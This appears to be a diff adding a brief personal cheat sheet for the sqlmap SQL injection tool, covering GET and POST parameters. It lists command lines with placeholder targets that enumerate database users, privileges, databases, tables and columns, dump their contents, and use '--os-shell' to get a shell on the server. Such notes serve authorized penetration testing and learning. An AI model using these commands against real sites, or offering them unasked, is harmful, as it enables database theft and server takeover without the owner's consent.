@@ -1,0 +1,49 @@
+ 
+ =======================================================
+                   get parameters
+ =======================================================
+ 
+ sqlmap -u "<URL>" -p <parameter>
+ sqlmap -u "<URL>" -p <parameter> --banner
+ sqlmap -u "<URL>" -p <parameter> --users
+ sqlmap -u "<URL>" -p <parameter> --is-dba
+ sqlmap -u "<URL>" -p <parameter> --dbs
+ sqlmap -u "<URL>" -p <parameter> -D <database> --tables
+ sqlmap -u "<URL>" -p <parameter> -D <database> -T <table> --columns
+ sqlmap -u "<URL>" -p <parameter> -D <database> -T <table> -C <column> --dump
+ 
+ or ................
+ 
+ sqlmap -u "<URL>" -p <parameter> --dump
+ 
+ ==========================================================================
+ 
+ options can make sqlmap more specific and less load on the server:
+ 
+ --dbms = Mysql .............. choose database type
+ --technique=U .............choose UNION technique
+ --technique=B .............choose Blind technique
+ 
+ =======================================================
+                   post parameters
+ =======================================================
+ 
+ sqmap -u <URL> --data=<POST string> -p <parameter>
+ 
+ =======================================================
+ 
+ sqlmap -r <request file.txt> -p <parameter> 
+ we can bring request file from burp.
+ 
+ sqlmap -r <request file.txt> -p <parameter> --os-shell
+ to bring shell on the server.
+
+ =======================================================
+ 
+ blind sql:
+ 
+ sqlmap -u "<URL>" -p <parameter> --technique=B --dump
+
+
+
+
